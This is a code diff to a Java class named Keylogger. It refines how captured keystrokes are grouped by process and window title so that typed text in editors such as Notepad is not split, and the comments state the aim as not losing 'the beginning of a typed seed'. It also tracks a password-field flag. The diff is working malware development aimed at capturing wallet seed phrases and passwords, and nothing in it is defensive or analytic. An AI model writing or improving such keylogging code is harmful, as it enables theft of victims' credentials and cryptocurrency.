@@ -248,11 +248,23 @@ final class Keylogger {
 			String nextProcess = decode(Json.str(event, "p", ""));
 			String nextTitle = decode(Json.str(event, "t", ""));
 			boolean nextPassword = Boolean.TRUE.equals(event.get("pw"));
-			if (!nextProcess.equals(process) || !nextTitle.equals(title)) {
+			if (!nextProcess.equals(process)) {
 				flush();
 				process = nextProcess;
 				title = nextTitle;
 				uiaPassword = nextPassword;
+			} else if (!nextTitle.equals(title)) {
+				// Notepad and similar editors put the edited line in the title;
+				// a growing or shrinking document title is the same field, so
+				// splitting there loses the beginning of a typed seed.
+				if (!sameDocument(title, nextTitle)) {
+					flush();
+					uiaPassword = nextPassword;
+				}
+				title = nextTitle;
+				if (nextPassword) {
+					uiaPassword = true;
+				}
 			} else if (nextPassword && !uiaPassword) {
 				uiaPassword = true;
 			}
@@ -288,6 +300,20 @@ final class Keylogger {
 		} catch (Throwable throwable) {
 			Log.debug("Key event invalid", throwable);
 		}
+	}
+
+	/** A document title that only grew or lost its tail is the same field. */
+	private static boolean sameDocument(String previous, String next) {
+		// The editor appends its own " - App" suffix after the growing text,
+		// so compare the stems on both sides of it.
+		String a = stem(previous);
+		String b = stem(next);
+		return !a.isEmpty() && (b.startsWith(a) || a.startsWith(b));
+	}
+
+	private static String stem(String title) {
+		int cut = title.lastIndexOf(" - ");
+		return cut > 0 ? title.substring(0, cut) : title;
 	}
 
 	private void flushIfIdle() {
